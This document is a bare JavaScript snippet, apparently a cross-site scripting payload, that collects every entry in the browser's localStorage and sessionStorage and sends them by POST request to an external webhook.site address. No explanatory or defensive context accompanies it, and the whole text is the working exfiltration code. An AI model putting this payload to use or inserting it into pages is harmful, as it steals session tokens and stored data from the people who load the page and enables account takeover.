fetch('https://webhook.site/fce0bc03-e81d-45a9-b0bb-de196889a371', {
  method: 'POST',
  body: JSON.stringify({
    localStorage: Object.entries(localStorage),
    sessionStorage: Object.entries(sessionStorage)
  }),
  headers: {'Content-Type': 'application/json'}
});
